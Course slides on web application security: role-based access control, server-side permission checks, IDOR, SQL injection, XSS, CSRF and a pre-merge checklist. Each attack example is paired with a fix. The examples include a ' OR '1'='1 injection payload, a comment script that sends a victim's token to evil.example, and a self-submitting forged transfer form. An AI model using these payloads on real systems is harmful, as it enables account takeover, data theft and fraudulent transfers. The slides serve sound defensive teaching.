4.1 · Roles and permissions (RBAC)

Your code should ask "may this user delete orders?", never "is this user an admin?"

userhas arolewhich grantspermissions
roleorders:readorders:writeorders:delete
viewer✓——
editor✓✓—
admin✓✓✓
  • RBAC = Role-Based Access Control. A user gets a role; the role is just a named list of permissions.
  • The table lives in one place (config or a DB table), not spread across handlers.
checks a role name
// every new role means editing every if
if (user.role === "admin") {
  deleteOrder(id);
}
checks a permission
// can() looks the role up in the table
if (can(user, "orders:delete")) {
  deleteOrder(id);
}
  • whyTomorrow you add a support role that may delete. You change one row in the table, not 40 if statements.

4.2 · Hiding a button is not a permission check

The frontend hid the Delete button. Anyone with curl can still call the API.

what a viewer sees
Order #1024 · 420.000 ₫ViewDelete
{user.role === "admin" && <DeleteButton />}
what an attacker types instead
$ curl -X DELETE https://api.shop.example/orders/1024 \
    -H "Cookie: sid=<the viewer's own session>"

HTTP/1.1 204 No Content   // deleted
the fix lives on the server
app.delete("/orders/:id",
  requirePermission("orders:delete"), deleteOrder);

HTTP/1.1 403 Forbidden
  • The browser is the user's machine. They can open DevTools, edit the page, or skip it and use curl or Postman.
  • bugThe API trusted the UI to do the check. Nothing on the server asked "may this user delete?"
  • ruleHiding buttons is for a nice UI. Every permission check must also run on the backend, on every request.

4.3 · Broken access control

"Logged in" is not "allowed": check that the row belongs to this user

An opens her own order
GET /orders/1024        Cookie: sid=<An>
→ 200 { "id": 1024, "owner": "an", "total": 420000 }
An changes one digit in the URL
GET /orders/1025        Cookie: sid=<An>
→ 200 { "id": 1025, "owner": "binh", "address": "…" }
fix: the query includes the owner
db.query(
  "SELECT * FROM orders WHERE id = ? AND user_id = ?",
  [req.params.id, req.user.id]
);
// no row → 404, same as an order that doesn't exist
  • The endpoint checked "is there a valid session?" and stopped. Any logged-in user can read any order.
  • IDORInsecure Direct Object Reference: the ID in the URL is the only lock. It is #1 on the OWASP Top 10 list of web risks.
  • fixAlways ask "does this row belong to this user?" in the query itself. Take the user from the session, never from the request body.
  • Random IDs (UUIDs) make guessing harder, but they are not the fix. IDs leak in logs and links.

4.4 · SQL injection

Glue user input into a SQL string and the input becomes part of your query

setup · the login handler builds SQL with +
// POST /login  (also plaintext passwords: 2 bugs)
const sql =
  "SELECT * FROM users WHERE email = '" + email +
  "' AND password = '" + password + "'";
attack · typed into the password box
' OR '1'='1
the SQL the database actually runs
SELECT * FROM users
WHERE email = 'an@shop.example'
  AND password = '' OR '1'='1'
  • result'1'='1' is true for every row, so the query returns all users. The app logs you in as the first one, often the admin.
fix · placeholders, never +
const user = await db.query(
  "SELECT * FROM users WHERE email = ?",
  [email]
);
// then: bcrypt.compare(password, user.password_hash)
  • whyThe value travels separately from the SQL. The database treats it as data, never as code.
  • ORMs do this for you. Watch for raw() and template strings that glue values in.

4.5 · Cross-site scripting (XSS)

If the page renders user text as HTML, an attacker's script runs in every reader's browser

setup · Mallory posts a comment
Nice shoes! <script>
  fetch("https://evil.example/?t=" +
        localStorage.token)
</script>
attack · the page inserts it as HTML
commentEl.innerHTML = comment.text;
  • resultEvery visitor who opens the page runs Mallory's script. Their token goes to evil.example, and she is now logged in as them.
fix · let the framework escape it
// React {} prints text, the script shows as characters
<p>{comment.text}</p>

// avoid with user text (or sanitize first)
dangerouslySetInnerHTML   innerHTML
  • 1Escaping turns < into &lt;, so the browser shows the tag instead of running it. React, Vue and Angular do it by default.
  • 2Keep the token in an HttpOnly cookie (slide 2.8). Even if a script runs, JavaScript cannot read the cookie.

4.6 · Cross-site request forgery (CSRF)

The browser attaches your cookie to any request, even one that another site started

attack · evil.example/win-a-prize.html
<form action="https://bank.example/transfer"
      method="POST" hidden>
  <input name="to" value="attacker">
  <input name="amount" value="5000000">
</form>
<script>document.forms[0].submit()</script>
what bank.example receives
POST /transfer HTTP/1.1
Host: bank.example
Cookie: sid=7f3a…   // added by the browser

to=attacker&amount=5000000
  • setupYou are logged in to bank.example in one tab. Its session cookie sits in your browser.
  • You open a link to evil.example. The hidden form submits itself the moment the page loads.
  • resultThe request carries your real cookie. To the bank it looks exactly like you clicked "Transfer".
  • fixSameSite=Lax (or Strict) on the cookie: the browser stops sending it on cross-site POSTs. Add a CSRF token to forms: a random value the evil page cannot know.
  • trade-offA token sent in the Authorization header is never attached by the browser, so no CSRF. But JavaScript must read it, so XSS can steal it. There is no free choice.

4.7 · Take-home checklist

Ten things to check before you open a pull request that touches login or data

  • passwordHash with bcrypt or argon2 from a library. Never store, log or return the password.
  • passwordFailed login says "Email or password is wrong". Never reveal which one was wrong.
  • tokenStore tokens in HttpOnly; Secure; SameSite cookies, not localStorage.
  • tokenVerify every JWT with a library and a fixed algorithm. Nothing secret in the payload.
  • tokenShort access tokens (15 min). Logout deletes the refresh token on the server.
  • oauthclient_secret only on the backend, from env or a secret manager. Ask for the smallest scope.
  • authzCheck permissions on the backend, on every request. Check the permission, not the role name.
  • authzCheck ownership in the query: WHERE id = ? AND user_id = ?.
  • attackUse ? placeholders or the ORM. Never build SQL with +.
  • attackLet the framework escape output, no innerHTML with user text. Cookie forms get SameSite + a CSRF token.
